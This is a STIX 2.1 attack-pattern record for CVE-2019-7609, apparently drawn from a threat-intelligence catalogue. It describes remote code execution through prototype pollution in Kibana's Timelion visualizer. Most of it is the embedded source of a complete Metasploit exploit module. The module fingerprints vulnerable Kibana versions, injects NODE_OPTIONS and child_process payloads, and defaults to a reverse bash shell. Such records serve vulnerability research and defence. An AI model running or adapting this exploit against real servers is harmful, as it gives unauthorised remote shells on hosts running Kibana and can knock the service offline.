{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--703ecd6a-4f8d-4ef6-8227-396a6b01f5b9",
    "created": "2024-08-14T17:03:29.722198Z",
    "modified": "2024-08-14T17:03:29.722201Z",
    "name": "Kibana Timelion Prototype Pollution RCE",
    "description": " Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This leads to an arbitrary command execution with permissions of the Kibana process on the host system.  Exploitation will require a service or system reboot to restore normal operation.  The WFSDELAY parameter is crucial for this exploit. Setting it too high will cause MANY shells (50-100+), while setting it too low will cause no shells to be obtained. WFSDELAY of 10 for a docker image caused 6 shells.  Tested against kibana 6.5.4.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/kibana_timelion_prototype_pollution_rce.rb",
            "external_id": "kibana_timelion_prototype_pollution_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mpgn/CVE-2019-7609"
        },
        {
            "source_name": "reference",
            "url": "https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-7609"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n  include Msf::Exploit::Remote::HttpClient\n  prepend Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Kibana Timelion Prototype Pollution RCE',\n        'Description' => %q{\n          Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer.\n          An attacker with access to the Timelion application could send a request that will attempt to execute\n          javascript code. This leads to an arbitrary command execution with permissions of the\n          Kibana process on the host system.\n\n          Exploitation will require a service or system reboot to restore normal operation.\n\n          The WFSDELAY parameter is crucial for this exploit. Setting it too high will cause MANY shells\n          (50-100+), while setting it too low will cause no shells to be obtained. WFSDELAY of 10 for a\n          docker image caused 6 shells.\n\n          Tested against kibana 6.5.4.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Micha\u0142 Bentkowski', # original PoC, analysis\n          'Gaetan Ferry' # more analysis\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/mpgn/CVE-2019-7609'],\n          [ 'URL', 'https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/'],\n          [ 'CVE', '2019-7609']\n        ],\n        'Platform' => ['unix'],\n        'Privileged' => false,\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2019-10-30',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_bash',\n          'WfsDelay' => 10 # can take a minute to run\n        },\n        'Notes' => {\n          # the webserver doesn't die, but certain requests no longer respond before a timeout\n          # when things go poorly\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(5601),\n        OptString.new('TARGETURI', [ true, 'The URI of the Kibana Application', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'kibana'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    # this pulls a big JSON blob that we need as it has the version\n    unless %r{<kbn-injected-metadata data=\"([^\"]+)\"></kbn-injected-metadata>} =~ res.body\n      return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, unable to determine version\")\n    end\n\n    version_json = CGI.unescapeHTML(Regexp.last_match(1))\n\n    begin\n      json_body = JSON.parse(version_json)\n    rescue JSON::ParserError\n      return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, unable to determine version\")\n    end\n\n    return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, unable to determine version\") if json_body['version'].nil?\n\n    @version = json_body['version']\n\n    if Rex::Version.new(@version) < Rex::Version.new('5.6.15') ||\n       (\n         Rex::Version.new(@version) < Rex::Version.new('6.6.1') &&\n         Rex::Version.new(@version) >= Rex::Version.new('6.0.0')\n       )\n      return CheckCode::Appears(\"Exploitable Version Detected: #{@version}\")\n    end\n\n    CheckCode::Safe(\"Unexploitable Version Detected: #{@version}\")\n  end\n\n  def get_xsrf\n    vprint_status('Grabbing XSRF Token')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'bundles', 'canvas.bundle.js'),\n      'keep_cookies' => true\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 200\n\n    return Regexp.last_match(1) if /\"kbn-xsrf\":\"([^\"]+)\"/ =~ res.body\n\n    nil\n  end\n\n  def trigger_socket\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'socket.io/'), # trailing / is required\n      'keep_cookies' => true,\n      'headers' => {\n        'kbn-xsrf' => @xsrf\n      },\n      'vars_get' => {\n        'EIO' => 3,\n        'transport' => 'polling'\n      }\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 200\n  end\n\n  def send_injection(reset: false)\n    if reset\n      pload = \".es(*).props(label.__proto__.env.AAAA='').props(label.__proto__.env.NODE_OPTIONS='')\"\n    else\n      # we leave a marker for our payload to avoid having .to_json process it and make it unusable by the host OS\n      pload = %|.es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"PAYLOADHERE\");process.exit()//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')|\n    end\n    body = {\n      'sheet' => [pload],\n      'time' => {\n        'from' => 'now-15m',\n        'to' => 'now',\n        'mode' => 'quick',\n        'interval' => 'auto',\n        'timezone' => 'America/New_York'\n      }\n    }\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'timelion', 'run'),\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'headers' => { 'kbn-version' => @version },\n      'data' => body.to_json.sub('PAYLOADHERE', payload.encoded.gsub(\"'\", \"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\")),\n      'keep_cookies' => true\n    )\n    Rex.sleep(2) # let this take hold, if we go too fast we dont get the shell\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 200\n  end\n\n  def exploit\n    check if @version.nil?\n    print_status('Polluting Prototype in Timelion')\n    send_injection\n\n    @xsrf = get_xsrf\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to grab XSRF token\") if @xsrf.nil?\n\n    print_status('Trigginger payload execution via canvas socket')\n    trigger_socket\n    print_status('Waiting for shells')\n    Rex.sleep(datastore['WFSDELAY'] / 10)\n    unless @reset_done\n      print_status('Unsetting to stop raining shells from a lacerated kibana')\n      send_injection(reset: true)\n      trigger_socket\n    end\n  end\n\n  def on_new_session(_client)\n    return if @reset_done\n\n    print_status('Unsetting to stop raining shells from a lacerated kibana')\n    send_injection(reset: true)\n    trigger_socket\n    @reset_done = true\n  ensure\n    super\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-10-30",
    "x_mitre_platforms": [
        "['unix']"
    ]
}